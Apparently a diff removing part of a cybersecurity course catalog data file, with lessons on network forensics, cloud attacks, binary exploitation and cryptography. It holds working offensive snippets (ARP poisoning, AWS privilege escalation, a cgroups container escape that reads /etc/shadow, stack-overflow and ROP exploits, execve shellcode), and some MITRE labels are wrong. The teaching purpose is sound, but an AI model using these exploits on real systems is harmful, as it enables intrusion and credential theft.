-        mitre: "T1071.001 - Web Protocols C2",
-        cve: "Suricata Signature Specification",
-        theory:
-          "Suricata inspection engines evaluate network packets against rules containing protocol, header flags, payload content, depth, and regex modifiers. Writing efficient rules prevents packet drops on 10Gbps enterprise sensor links.",
-        codeSnippet: `# Suricata C2 HTTP Beacon Detection Rule:
-alert http $HOME_NET any -> $EXTERNAL_NET any (
-  msg:"MALWARE Cobalt Strike Default Malleable C2 Beacon";
-  flow:established,to_server;
-  http.method; content:"GET";
-  http.uri; content:"/submit.php?id="; startswith;
-  http.header; content:"Cookie: SESSIONID=";
-  classtype:trojan-activity;
-  sid:1000984; rev:1;
-)`,
-        codeLanguage: "bash",
-        payloadExample: `suricata -r evidence_capture.pcap -c /etc/suricata/suricata.yaml -k none`,
-        quiz: {
-          question: "Why is 'flow:established,to_server' essential in Suricata TCP signatures?",
-          options: [
-            "It ensures only completed TCP 3-way handshakes heading toward the server trigger the rule, ignoring spoofed SYN floods",
-            "It turns off firewall rules",
-            "It speeds up DNS resolutions",
-            "It tells the OS to reset the adapter",
-          ],
-          correct: 0,
-          explanation: "Flow tracking filters out stateless scans and SYN floods, drastically cutting false positive alert volume.",
-        },
-      },
-      {
-        id: "s5",
-        title: "Live Incident Simulation: APT Lateral Movement Containment",
-        duration: "2h 30m",
-        objective: "Orchestrate real-time host isolation, firewall policy updates, and Active Directory Kerberos ticket revocation.",
-        mitre: "T1021 - Remote Services & Lateral Movement",
-        cve: "Golden Ticket & Pass-the-Hash Remediation",
-        theory:
-          "When lateral movement is confirmed across an Active Directory domain, containment must isolate compromised endpoints while immediately triggering the KRBTGT password reset procedure twice to invalidate active Kerberos Golden Tickets.",
-        codeSnippet: `# Windows Active Directory Incident Containment PowerShell:
-# 1. Disable Compromised Domain User:
-Disable-ADAccount -Identity "svc_backup"
-
-# 2. Kill Active Remote SMB & WMI Sessions:
-Get-CimInstance -ClassName Win32_SessionProcess | Where-Object { $_.UserName -eq "svc_backup" } | Stop-Process -Force`,
-        codeLanguage: "bash",
-        payloadExample: `Invoke-HostIsolation -TargetHost "FINANCE-WS-09" -Reason "Cobalt Strike C2 Beacon"`,
-        quiz: {
-          question: "Why must the Active Directory KRBTGT account password be reset TWICE during Golden Ticket recovery?",
-          options: [
-            "Active Directory stores both current and previous KRBTGT password hashes to support ticket validation history",
-            "To test replication speed between domain controllers",
-            "Because Windows limits password changes to 2 times a day",
-            "To clear the DNS cache on client PCs",
-          ],
-          correct: 0,
-          explanation: "AD maintains the previous password hash in history to allow graceful transition of non-expired tickets; resetting twice purges the adversary's forged Golden Ticket validity.",
-        },
-      },
-    ],
-  },
-  {
-    id: "mod-net301",
-    code: "NET-301",
-    category: "network",
-    track: "Network Forensics & Packet Analysis",
-    title: "Packet Forensics, Wireshark Protocol Analysis & MITM Attacks",
-    difficulty: "Intermediate",
-    duration: "16 Hours",
-    lessonsCount: 5,
-    labsCount: 3,
-    enrolledCount: "3,410",
-    mitre: "T1040 / T1557",
-    cert: "CompTIA Network+ / CCNA",
-    cvssBase: "7.9 HIGH",
-    threatProfile: "Adversary Eavesdropping & Protocol Manipulation",
-    description:
-      "Dissect layer-2 through layer-7 network traffic down to raw bytes. Detect ARP poisoning, DNS exfiltration tunnels, and rogue DHCP servers using Wireshark, Tshark, and tcpdump capture filters.",
-    labLink: "/labs",
-    labId: "lab-06",
-    syllabus: [
-      {
-        id: "s1",
-        title: "TCP 3-Way Handshake, Window Scaling & Reset Injection",
-        duration: "2h 30m",
-        objective: "Analyze TCP SYN, SYN-ACK, ACK sequence numbers, detect RST attacks, and decode window scale options.",
-        mitre: "T1040 - Network Sniffing",
-        cve: "RFC 793 / RFC 7323",
-        theory: "TCP maintains reliability through 32-bit sequence and acknowledgment numbers. Understanding sequence calculations is paramount to detecting TCP RST packet injection attacks designed to terminate established VPN tunnels.",
-        codeSnippet: `// Tshark filter to isolate abnormal TCP RST packets:
-tshark -r capture.pcap -Y "tcp.flags.reset == 1 && tcp.seq == 1" -T fields -e ip.src -e ip.dst -e tcp.srcport`,
-        codeLanguage: "bash",
-        payloadExample: `tcp.flags.syn == 1 and tcp.flags.ack == 0`,
-        quiz: {
-          question: "What flags are present in the second packet of a healthy TCP 3-way handshake?",
-          options: ["SYN and ACK", "SYN only", "ACK and FIN", "PSH and URG"],
-          correct: 0,
-          explanation: "The server responds to the client's initial SYN packet with SYN-ACK.",
-        },
-      },
-      {
-        id: "s2",
-        title: "Wireshark Display Filter Mastery & Stream Reconstruction",
-        duration: "3h 15m",
-        objective: "Filter through millions of PCAP packets to extract reconstructed files, credentials, and TLS server names.",
-        mitre: "T1040 - Network Traffic Sniffing",
-        cve: "PCAP Analysis Workflow",
-        theory: "Wireshark's Follow TCP Stream reassembles fragmented IP packets into human-readable data streams, exposing cleartext protocols like HTTP, FTP, and unencrypted SMTP authentication exchanges.",
-        codeSnippet: `# Wireshark Display Filter:
-http.request.method == "POST" && http contains "password"`,
-        codeLanguage: "bash",
-        payloadExample: `tls.handshake.extensions_server_name contains "internal-corp"`,
-        quiz: {
-          question: "Which Wireshark filter isolates all DNS queries for TXT records (often used for C2 or exfiltration)?",
-          options: ["dns.qry.type == 16", "dns.flags.response == 1", "dns.qry.name contains 'txt'", "udp.port == 80"],
-          correct: 0,
-          explanation: "DNS Type 16 corresponds to TXT records in RFC 1035.",
-        },
-      },
-      {
-        id: "s3",
-        title: "ARP Spoofing & SSL/TLS Man-in-the-Middle Inspection",
-        duration: "3h 45m",
-        objective: "Execute layer-2 ARP poisoning and detect spoofed gratuitous ARP replies on switched networks.",
-        mitre: "T1557.002 - ARP Poisoning",
-        cve: "CWE-300: Channel Accessible by Non-Endpoint",
-        theory: "Address Resolution Protocol (ARP) lacks authentication. Any workstation can broadcast unsolicited ARP replies claiming ownership of the default gateway IP, rerouting all subnet traffic through an attacker machine.",
-        codeSnippet: `# Python Scapy ARP Poisoner snippet:
-from scapy.all import send, ARP
-arp_resp = ARP(op=2, pdst="192.168.1.50", hwdst="00:11:22:33:44:55", psrc="192.168.1.1")
-send(arp_resp, loop=1, inter=2)`,
-        codeLanguage: "python",
-        payloadExample: `arp.duplicate-address-frame or (arp.opcode == 2 and eth.dst == ff:ff:ff:ff:ff:ff)`,
-        quiz: {
-          question: "What switch technology validates ARP packets against DHCP snooping bindings to prevent ARP poisoning?",
-          options: ["DAI (Dynamic ARP Inspection)", "Spanning Tree Protocol (STP)", "VLAN Trunking Protocol (VTP)", "BGP Route Reflector"],
-          correct: 0,
-          explanation: "Dynamic ARP Inspection (DAI) cross-references ARP MAC-IP pairs with the DHCP Snooping database and drops invalid packets.",
-        },
-      },
-      {
-        id: "s4",
-        title: "DNS Tunneling Detection & Protocol Anomaly Profiling",
-        duration: "3h 00m",
-        objective: "Profile query length, subdomain entropy, and request volume to expose DNS exfiltration channels.",
-        mitre: "T1071.004 - DNS Data Exfiltration",
-        cve: "DNS Tunneling Vector",
-        theory: "Attackers encapsulate arbitrary TCP payloads inside DNS subdomain lookups (e.g., base64_payload.attacker-ns.com). Because enterprise recursive resolvers forward these queries outward, outbound firewalls often allow them unchecked.",
-        codeSnippet: `# Calculate Shannon Entropy on DNS subdomains to detect tunneling:
-import math
-def entropy(s):
-    p, l = [float(s.count(c)) / len(s) for c in dict.fromkeys(list(s))], len(s)
-    return -sum([p_i * math.log(p_i) / math.log(2.0) for p_i in p])`,
-        codeLanguage: "python",
-        payloadExample: `tshark -r traffic.pcap -T fields -e dns.qry.name | awk '{print length, $0}' | sort -n`,
-        quiz: {
-          question: "What characteristic is a primary statistical hallmark of DNS tunneling?",
-          options: ["Unusually long subdomains with high Shannon entropy", "Low query volume during daytime", "Small TXT record responses", "Only querying .org domains"],
-          correct: 0,
-          explanation: "High entropy and lengthy subdomain strings indicate encrypted/encoded binary payloads packaged in DNS labels.",
-        },
-      },
-      {
-        id: "s5",
-        title: "Network Forensics PCAP Challenge: Extracting Exfiltrated Credentials",
-        duration: "3h 30m",
-        objective: "Investigate a multi-gigabyte forensic PCAP dump to reconstruct an adversary's exfiltration archive and identify leaked secrets.",
-        mitre: "T1048 - Exfiltration Over Alternative Protocol",
-        cve: "Forensic PCAP Challenge",
-        theory: "Hands-on forensic synthesis: locate suspicious high-volume outbound sessions, reassemble HTTP/FTP transfer streams, and carve out files using tools like foremost and NetworkMiner.",
-        codeSnippet: `# Carve files directly from PCAP using tshark:
-tshark -r evidence.pcap --export-objects "http,./extracted_files/"`,
-        codeLanguage: "bash",
-        payloadExample: `FLAG{PCAP_FR3NSIC_STRE4M_UNCOV3R3D}`,
-        quiz: {
-          question: "Which tool automatically parses and reconstructs transmitted files, images, and credentials from PCAP dumps?",
-          options: ["NetworkMiner / Wireshark Export Objects", "Nmap", "Metasploit", "Netcat"],
-          correct: 0,
-          explanation: "NetworkMiner and Wireshark's Export Objects feature automate file reassembly directly from packet streams.",
-        },
-      },
-    ],
-  },
-  {
-    id: "mod-cld401",
-    code: "CLD-401",
-    category: "cloud",
-    track: "Cloud & DevSecOps",
-    title: "Cloud Infrastructure Security & AWS IAM Privilege Escalation",
-    difficulty: "Specialist",
-    duration: "22 Hours",
-    lessonsCount: 6,
-    labsCount: 5,
-    enrolledCount: "2,290",
-    mitre: "T1078.004 / T1538",
-    cert: "AWS Certified Security / CCSP",
-    cvssBase: "9.1 CRITICAL",
-    threatProfile: "Cloud Identity Hijacking & Container Escape",
-    description:
-      "Inspect real misconfigurations across AWS, Azure, and Kubernetes. Learn how attackers leverage PassRole permissions, S3 bucket enumeration, and container escapes to compromise enterprise cloud accounts.",
-    labLink: "/labs",
-    labId: "lab-03",
-    syllabus: [
-      {
-        id: "s1",
-        title: "Cloud Shared Responsibility & IAM Policy Evaluation Logic",
-        duration: "3h 00m",
-        objective: "Master AWS IAM explicit deny, permission boundaries, and SCP hierarchy.",
-        mitre: "T1078.004 - Cloud Accounts",
-        cve: "IAM Policy Evaluation Engine",
-        theory: "AWS IAM evaluates requests by checking: 1) Explicit Deny, 2) Organizations SCPs, 3) Resource-based policies, 4) IAM Permissions Boundaries, 5) Session policies, 6) Identity-based policies.",
-        codeSnippet: `{
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Effect": "Allow",
-      "Action": "iam:PassRole",
-      "Resource": "arn:aws:iam::123456789012:role/AdminRole"
-    }
-  ]
-}`,
-        codeLanguage: "json",
-        payloadExample: `aws sts get-caller-identity`,
-        quiz: {
-          question: "In AWS IAM evaluation, what always takes absolute precedence over any Allow policy?",
-          options: ["An explicit Deny in any applicable policy", "A root account permission", "An administrator role", "A resource-based policy"],
-          correct: 0,
-          explanation: "In AWS IAM, an explicit Deny in ANY policy overrides all Allows.",
-        },
-      },
-      {
-        id: "s2",
-        title: "AWS IAM 21 Privilege Escalation Attack Vectors Explained",
-        duration: "4h 30m",
-        objective: "Exploit CreatePolicyVersion, SetDefaultPolicyVersion, and PassRole permissions to escalate to AdministratorAccess.",
-        mitre: "T1548 - Abuse Elevation Control Mechanism",
-        cve: "Rhino Security 21 IAM Vectors",
-        theory: "If a low-privileged IAM principal has iam:CreatePolicyVersion permission on their own policy, they can create a new version granting themselves AdministratorAccess ('*:*') and set it as the default.",
-        codeSnippet: `# AWS CLI Privilege Escalation:
-aws iam create-policy-version \\
-  --policy-arn arn:aws:iam::123456789012:policy/DevPolicy \\
-  --policy-document file://admin_policy.json \\
-  --set-as-default`,
-        codeLanguage: "bash",
-        payloadExample: `aws iam attach-user-policy --user-name low_priv --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
-        quiz: {
-          question: "Which IAM permission allows an attacker to attach a powerful administrative role to a newly launched EC2 instance?",
-          options: ["iam:PassRole combined with ec2:RunInstances", "s3:GetObject", "cloudwatch:PutMetricData", "sns:Publish"],
-          correct: 0,
-          explanation: "iam:PassRole gives authorization to pass a role to a service (like EC2), granting the instance full access to that role's permissions.",
-        },
-      },
-      {
-        id: "s3",
-        title: "S3 Bucket Auditing, ACL Misconfigurations & Object Encryption",
-        duration: "3h 15m",
-        objective: "Enumerate unauthenticated S3 buckets, analyze bucket policies, and enforce SSE-KMS customer-managed keys.",
-        mitre: "T1530 - Data from Cloud Storage Object",
-        cve: "Public S3 Data Leaks",
-        theory: "Many enterprise cloud data breaches result from misinterpreting 'AllUsers' or 'AuthenticatedUsers' in S3 ACLs. 'AuthenticatedUsers' refers to ANY AWS account globally, not just users within your organization.",
-        codeSnippet: `# Check bucket public access block:
-aws s3api get-public-access-block --bucket sensitive-enterprise-backups`,
-        codeLanguage: "bash",
-        payloadExample: `aws s3 sync s3://target-leaky-bucket/ ./local_dump/ --no-sign-request`,
-        quiz: {
-          question: "In AWS S3 permissions, who is included in the 'AuthenticatedUsers' grantee group?",
-          options: ["Any valid AWS account owner in the entire world", "Only users inside your specific AWS Organization", "Only IAM users in that specific account", "Only users authenticated with MFA"],
-          correct: 0,
-          explanation: "AWS defines 'AuthenticatedUsers' as any person with an active AWS account anywhere on Earth.",
-        },
-      },
-      {
-        id: "s4",
-        title: "Kubernetes Cluster Hardening: RBAC & Pod Security Standards",
-        duration: "4h 00m",
-        objective: "Configure Kubernetes RBAC roles, audit privileged container security contexts, and deploy Kyverno admission controllers.",
-        mitre: "T1611 - Escape to Host",
-        cve: "CVE-2024-21626 / CWE-250",
-        theory: "Kubernetes pods configured with 'privileged: true' or mounting the host filesystem '/var/run/docker.sock' can trivially escape container namespaces and execute arbitrary root commands on worker nodes.",
-        codeSnippet: `# Secure Pod Security Context in Kubernetes YAML:
-spec:
-  securityContext:
-    runAsNonRoot: true
-    seccompProfile:
-      type: RuntimeDefault
-  containers:
-  - name: secure-app
-    securityContext:
-      allowPrivilegeEscalation: false
-      readOnlyRootFilesystem: true
-      capabilities:
-        drop: ["ALL"]`,
-        codeLanguage: "yaml",
-        payloadExample: `kubectl auth can-i create pods --as system:serviceaccount:default:web-sa`,
-        quiz: {
-          question: "What is the critical risk of mounting /var/run/docker.sock inside a container pod?",
-          options: ["The container can issue instructions to the host Docker daemon, creating root containers on the host node", "It increases network latency by 10ms", "It turns off Kubernetes load balancing", "It forces DNS queries through public servers"],
-          correct: 0,
-          explanation: "Access to docker.sock is equivalent to root on the underlying Kubernetes node.",
-        },
-      },
-      {
-        id: "s5",
-        title: "Container Breakout: Exploiting Privileged Pods & Docker Socket",
-        duration: "3h 45m",
-        objective: "Execute container breakout attacks, abuse host cgroups, and extract host node credentials.",
-        mitre: "T1611 - Container Escape",
-        cve: "CVE-2022-0185 / CVE-2024-21626",
-        theory: "Deep dive into Linux namespaces (PID, Mount, Net) and cgroups release_agent manipulation to execute host shell commands from inside a compromised container.",
-        codeSnippet: `# Linux cgroups release_agent container escape POC:
-mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
-mkdir -p /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-host_path=\`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab\`
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/sh' > /cmd
-echo "cat /etc/shadow > $host_path/output" >> /cmd
-chmod a+x /cmd
-sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"`,
-        codeLanguage: "bash",
-        payloadExample: `cat /proc/1/cgroup`,
-        quiz: {
-          question: "Which Linux kernel feature enforces boundary isolation between container processes and the host?",
-          options: ["Linux Namespaces and Control Groups (cgroups)", "SELinux swap space", "BASH history file", "TCP window scale"],
-          correct: 0,
-          explanation: "Namespaces isolate process trees, network, and mount points; cgroups govern resource quotas.",
-        },
-      },
-      {
-        id: "s6",
-        title: "Cloud Range Capstone: Lateral Movement from EC2 to Org Root",
-        duration: "3h 30m",
-        objective: "Chain together an SSRF on an EC2 app to steal instance role credentials, pivot to DynamoDB, and compromise the AWS Organization.",
-        mitre: "T1078.004 & T1538 - Cloud Pivot",
-        cve: "Full Multi-Tier Cloud Compromise",
-        theory: "Comprehensive scenario: demonstrate the complete lifecycle of a cloud breach, from an application flaw to full multi-account infrastructure takeover.",
-        codeSnippet: `# Extract and export instance profile credentials:
-export AWS_ACCESS_KEY_ID="ASIA..."
-export AWS_SECRET_ACCESS_KEY="..."
-export AWS_SESSION_TOKEN="..."
-aws organizations list-accounts`,
-        codeLanguage: "bash",
-        payloadExample: `FLAG{CLOUD_RANGE_PIVOT_ORG_ROOT_PWNED}`,
-        quiz: {
-          question: "What AWS service logs all API calls made across an AWS Organization for forensic investigations?",
-          options: ["AWS CloudTrail", "Amazon CloudWatch Metrics", "AWS X-Ray", "Amazon Inspector"],
-          correct: 0,
-          explanation: "AWS CloudTrail records every API call, caller identity, timestamp, source IP, and response elements.",
-        },
-      },
-    ],
-  },
-  {
-    id: "mod-rev501",
-    code: "REV-501",
-    category: "reverse",
-    track: "Binary Exploitation & Reversing",
-    title: "Binary Exploitation, x86_64 Stack Overflows & Ghidra",
-    difficulty: "Specialist",
-    duration: "26 Hours",
-    lessonsCount: 6,
-    labsCount: 5,
-    enrolledCount: "1,870",
-    mitre: "T1203 / T1055",
-    cert: "OSCP / OSED",
-    cvssBase: "9.8 CRITICAL",
-    threatProfile: "Memory Corruption & Shellcode Crafting",
-    description:
-      "Dive into CPU registers, stack frame mechanics, and memory corruption. Dissect compiled C/C++ binaries in Ghidra, craft shellcode payloads, and bypass modern exploit mitigations like ASLR and DEP.",
-    labLink: "/labs",
-    labId: "lab-02",
-    syllabus: [
-      {
-        id: "s1",
-        title: "x86_64 Architecture, Registers & Calling Conventions",
-        duration: "3h 30m",
-        objective: "Understand RAX, RBX, RDI, RSI, RBP, RSP and the System V AMD64 ABI calling convention.",
-        mitre: "T1203 - Exploitation for Client Execution",
-        cve: "x86_64 ABI Specification",
-        theory: "In x86_64 Linux, function arguments are passed in registers: RDI, RSI, RDX, RCX, R8, R9 before falling back to stack storage. Return addresses are pushed to the stack via the 'call' instruction and popped into RIP via 'ret'.",
-        codeSnippet: `; x86_64 Assembly function prologue & epilogue:
-push    rbp             ; Save old base pointer
-mov     rbp, rsp        ; Set new base pointer
-sub     rsp, 0x40       ; Allocate 64 bytes local buffer
-...
-leave                   ; mov rsp, rbp; pop rbp
-ret                     ; pop rip`,
-        codeLanguage: "assembly",
-        payloadExample: `gdb -q ./vulnerable_binary -ex "info registers"`,
-        quiz: {
-          question: "Which register in x86_64 Linux holds the first integer or pointer argument passed to a function?",
-          options: ["RDI", "RAX", "RSP", "RBX"],
-          correct: 0,
-          explanation: "The System V AMD64 calling convention uses RDI for the 1st parameter, RSI for the 2nd, and RDX for the 3rd.",
-        },
-      },
-      {
-        id: "s2",
-        title: "Ghidra Decompiler Fundamentals & Static Function Mapping",
-        duration: "4h 00m",
-        objective: "Reverse engineer stripped ELF and PE binaries in NSA Ghidra and recover data structures.",
-        mitre: "T1027 - Obfuscated Files or Information",
-        cve: "Static Analysis Workflow",
-        theory: "Ghidra decompiles raw machine instructions back into readable pseudo-C code by reconstructing stack frame variables, identifying cross-references (XREFs), and typing function signatures.",
-        codeSnippet: `// Ghidra decompiler output of vulnerable check:
-undefined8 check_authorization(char *input) {
-  char local_buffer [64];
-  strcpy(local_buffer, input); // UNBOUNDED COPY: Buffer Overflow!
-  return 0;
-}`,
-        codeLanguage: "c",
-        payloadExample: `ghidraHeadless /tmp/ghidra_proj Project -import ./target_elf -postScript Analysis.java`,
-        quiz: {
-          question: "In C, which function is notoriously unsafe because it performs string copying without checking destination buffer size?",
-          options: ["strcpy() / gets()", "strncpy()", "snprintf()", "fgets()"],
-          correct: 0,
-          explanation: "strcpy() and gets() continue copying bytes until encountering a null byte, regardless of destination buffer boundaries.",
-        },
-      },
-      {
-        id: "s3",
-        title: "Classic Stack-Based Buffer Overflow & RIP Control",
-        duration: "4h 30m",
-        objective: "Calculate stack padding offsets using cyclic patterns and overwrite the saved return address (RIP).",
-        mitre: "T1203 - Stack Memory Corruption",
-        cve: "CWE-121: Stack-based Buffer Overflow",
-        theory: "When an attacker inputs data exceeding the allocated stack buffer, the excess bytes overwrite saved RBP and the saved instruction pointer (RIP). When the function returns, CPU jumps execution to the attacker-controlled RIP.",
-        codeSnippet: `# Python pwntools exploit script:
-from pwn import *
-p = process('./vuln_app')
-offset = 72
-payload = b"A" * offset + p64(0x401156) # Jump directly to win() function!
-p.sendline(payload)
-p.interactive()`,
-        codeLanguage: "python",
-        payloadExample: `cyclic 100 && cyclic -l 0x6161616a`,
-        quiz: {
-          question: "What security mechanism inserts a random canary value right before the saved return pointer to detect stack corruption?",
-          options: ["Stack Canaries (Stack Smashing Protector)", "ASLR", "NX / DEP", "PIE"],
-          correct: 0,
-          explanation: "Stack canaries check that a hidden integer hasn't been modified before returning; if altered, the program halts immediately with '__stack_chk_fail'.",
-        },
-      },
-      {
-        id: "s4",
-        title: "Writing Custom Linux x86_64 Execve Shellcode",
-        duration: "4h 15m",
-        objective: "Write null-byte free x86_64 shellcode invoking sys_execve('/bin/sh', NULL, NULL).",
-        mitre: "T1059 - Command and Scripting Interpreter",
-        cve: "Shellcode Development",
-        theory: "Shellcode must avoid null bytes (0x00) if passed through string functions like strcpy. Attackers use XOR instructions (xor eax, eax) to produce zeros dynamically without embedding null literals.",
-        codeSnippet: `; Clean 23-byte Linux x86_64 /bin/sh shellcode:
-xor rax, rax
-push rax                ; null-terminate string
-mov rbx, 0x68732f2f6e69622f ; "/bin//sh"
-push rbx
-mov rdi, rsp            ; pointer to "/bin//sh"
-push rax
-mov rdx, rsp            ; null envp
-push rdi
-mov rsi, rsp            ; argv = ["/bin//sh", NULL]
-mov al, 59              ; sys_execve syscall number
-syscall`,
-        codeLanguage: "assembly",
-        payloadExample: `\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05`,
-        quiz: {
-          question: "What is the 64-bit Linux syscall number for sys_execve?",
-          options: ["59 (0x3b)", "1 (sys_write)", "0 (sys_read)", "60 (sys_exit)"],
-          correct: 0,
-          explanation: "In Linux x86_64, syscall number 59 (0x3b) corresponds to sys_execve.",
-        },
-      },
-      {
-        id: "s5",
-        title: "Return-Oriented Programming (ROP) Chains & ASLR Defeats",
-        duration: "5h 00m",
-        objective: "Defeat Non-Executable Stack (DEP/NX) by chaining binary gadgets ending in 'ret' to bypass memory protections.",
-        mitre: "T1055 - Return-Oriented Programming",
-        cve: "NX/DEP Bypass Technique",
-        theory: "When the stack is marked Non-Executable (NX), attackers cannot execute injected shellcode. Instead, they string together existing machine code snippets in executable binary memory called 'gadgets' (e.g., 'pop rdi; ret') to call system('/bin/sh').",
-        codeSnippet: `# ROP chain using pwntools:
-rop = ROP(elf)
-rop.raw(b"A" * 72)
-rop.call(elf.plt['puts'], [elf.got['puts']])
-rop.call(elf.symbols['main'])
-p.sendline(rop.chain())`,
-        codeLanguage: "python",
-        payloadExample: `ROPgadget --binary ./vuln --only "pop|ret"`,
-        quiz: {
-          question: "What instruction must terminate every gadget in a classic ROP chain?",
-          options: ["ret (return)", "jmp (jump)", "nop", "int3"],
-          correct: 0,
-          explanation: "The 'ret' instruction pops the next gadget address from the stack into RIP, transferring control to the next stage in the chain.",
-        },
-      },
-      {
-        id: "s6",
-        title: "Binary Target Challenge: Exploit Vulnerable Network Daemon",
-        duration: "4h 45m",
-        objective: "Reverse a remote TCP network service, defeat ASLR via information leak, and pop an interactive root shell.",
-        mitre: "T1203 & T1059 - Remote Daemon Exploitation",
-        cve: "Live Binary Target",
-        theory: "Synthesizing reverse engineering, offset discovery, libc information leak calculation, and remote ROP chain execution into a unified remote exploit.",
-        codeSnippet: `# Remote daemon interactive exploitation:
-p = remote('10.10.14.89', 9001)
-p.recvuntil(b'Enter token:')
-p.sendline(stage1_leak_payload)
-libc_base = u64(p.recv(8).ljust(8, b'\\x00')) - puts_offset
-p.sendline(stage2_system_payload)
-p.interactive()`,
-        codeLanguage: "python",
-        payloadExample: `FLAG{ROP_CH4IN_ASLR_L3AK_PWNED}`,
-        quiz: {
-          question: "How is ASLR (Address Space Layout Randomization) defeated in modern exploits?",
-          options: ["By leaking a known function's runtime address from memory to calculate the random base offset", "By rebooting the computer 10 times", "By using longer passwords", "ASLR cannot be defeated under any circumstances"],
-          correct: 0,
-          explanation: "ASLR randomizes memory by adding an offset to the entire module. Leaking one runtime address reveals that offset.",
-        },
-      },
-    ],
-  },
-  {
-    id: "mod-sec101",
-    code: "SEC-101",
-    category: "defensive",
-    track: "Cryptographic Engineering",
-    title: "Applied Cryptography, TLS/SSL & Public Key Infrastructure",
-    difficulty: "Novice",
-    duration: "12 Hours",
-    lessonsCount: 4,
-    labsCount: 2,
-    enrolledCount: "6,920",
-    mitre: "T1573 / T1557",
-    cert: "CompTIA Sec+ / CISSP",
-    cvssBase: "7.4 HIGH",
-    threatProfile: "Cryptographic Weakness & Certificate Spoofing",
-    description:
-      "Demystify symmetric vs asymmetric ciphers, hashing algorithms, and digital certificates. Learn how AES-GCM, RSA, and Elliptic Curves protect data in transit and at rest, and audit misconfigured SSL ciphers.",
-    labLink: "/labs",
-    labId: "lab-05",
-    syllabus: [
-      {
-        id: "s1",
-        title: "Symmetric Encryption: Block Ciphers, Modes & AES-GCM",
-        duration: "2h 30m",
-        objective: "Compare ECB vs CBC vs GCM modes, understand why ECB is insecure, and master authenticated Galois/Counter Mode.",
-        mitre: "T1573 - Encrypted Channel",
-        cve: "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
-        theory: "Electronic Codebook (ECB) encrypts each plaintext block independently with the same key, preserving plaintext patterns (the famous ECB Tux penguin). AES-GCM provides both confidentiality and tamper detection through authentication tags.",
-        codeSnippet: `// Proper AES-256-GCM Encryption in Node.js Crypto:
-const crypto = require('crypto');
-function encryptGCM(plaintext, key, iv) {
-  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
-  let enc = cipher.update(plaintext, 'utf8', 'hex');
-  enc += cipher.final('hex');
-  const tag = cipher.getAuthTag(); // Authentication Tag prevents bit flipping!
-  return { ciphertext: enc, tag: tag.toString('hex') };
-}`,
-        codeLanguage: "javascript",
-        payloadExample: `openssl enc -aes-256-gcm -in secret.txt -out secret.enc`,
-        quiz: {
-          question: "Why should AES-ECB mode NEVER be used for encrypting multi-block data?",
-          options: ["Identical plaintext blocks produce identical ciphertext blocks, leaking structural patterns", "It is 100x slower than other modes", "It requires 1024-bit keys", "It only works on Linux"],
-          correct: 0,
-          explanation: "ECB mode lacks diffusion: identical input blocks always produce identical cipher blocks, exposing patterns and structure.",
-        },
-      },
-      {
-        id: "s2",
-        title: "Asymmetric Cryptography: RSA, Diffie-Hellman & ECC",
-        duration: "3h 15m",
-        objective: "Understand public/private key pairs, modular arithmetic, ECDH key exchange, and Forward Secrecy.",
-        mitre: "T1573 - Asymmetric Cryptography",
-        cve: "Diffie-Hellman & RSA Foundations",
-        theory: "Diffie-Hellman allows two parties with no prior shared secret to establish a symmetric encryption key across an insecure channel. Elliptic Curve Cryptography (ECC) achieves equivalent security to RSA with significantly smaller key sizes (256-bit ECC ≈ 3072-bit RSA).",
-        codeSnippet: `# Generate an Ed25519 modern high-security private key:
-openssl genpkey -algorithm ed25519 -out private_key.pem
-openssl pkey -in private_key.pem -pubout -out public_key.pem`,
-        codeLanguage: "bash",
-        payloadExample: `openssl s_client -connect enterprise-server.local:443 -tls1_3`,
-        quiz: {
-          question: "What property ensures that past recorded sessions cannot be decrypted even if the server's private key is stolen later?",
-          options: ["PFS (Perfect Forward Secrecy)", "PKI Certificate Authority", "Salted Hashes", "CBC Padding"],
-          correct: 0,
-          explanation: "Ephemeral Diffie-Hellman exchanges generate unique temporary keys for each session, guaranteeing Perfect Forward Secrecy.",
-        },
-      },
-      {
-        id: "s3",
-        title: "Cryptographic Hashes & Salted HMAC Signatures",
-        duration: "2h 45m",
-        objective: "Distinguish between fast hashes (SHA-256) and slow password hashes (Argon2, bcrypt), and sign API requests with HMAC-SHA256.",
-        mitre: "T1003 - Password Storage Cracking",
-        cve: "CWE-916: Use of Password Hash With Insufficient Computational Effort",
-        theory: "Fast hashes like MD5 and SHA-256 are engineered for file verification and are disastrous for password storage because GPUs can compute billions of guesses per second. Password storage requires memory-hard functions like Argon2id or bcrypt.",
-        codeSnippet: `# Compute HMAC-SHA256 signature:
-echo -n "user_id=42&amount=5000" | openssl dgst -sha256 -hmac "super_secret_api_key"`,
-        codeLanguage: "bash",
-        payloadExample: `python3 -c "import argon2; print(argon2.PasswordHasher().hash('MasterPassword123!'))"`,
-        quiz: {
-          question: "Which password hashing algorithm won the Password Hashing Competition (PHC) and is recommended for modern systems?",
-          options: ["Argon2id", "MD5", "SHA-1", "Base64"],
-          correct: 0,
-          explanation: "Argon2id combines resistance against both side-channel attacks and GPU-assisted brute-forcing.",
-        },
-      },
-      {
-        id: "s4",
-        title: "PKI, Certificate Authorities & SSL/TLS Handshake Decryption",
-        duration: "3h 30m",
-        objective: "Inspect X.509 certificate chains, detect expired/revoked certs, and understand TLS 1.3 handshake optimization.",
-        mitre: "T1587.003 - Digital Certificates",
-        cve: "X.509 Trust Architecture",
-        theory: "Public Key Infrastructure (PKI) binds cryptographic public keys to validated organization identities through digital signatures issued by trusted Certificate Authorities (CAs). TLS 1.3 reduces the handshake to a single round-trip (1-RTT).",
-        codeSnippet: `# Inspect remote TLS certificate chain in terminal:
-openssl s_client -connect www.cloudflare.com:443 -showcerts < /dev/null`,
-        codeLanguage: "bash",
-        payloadExample: `openssl x509 -in cert.pem -text -noout`,
-        quiz: {
-          question: "How many round-trips (RTT) are required to complete a full TLS 1.3 cryptographic handshake?",
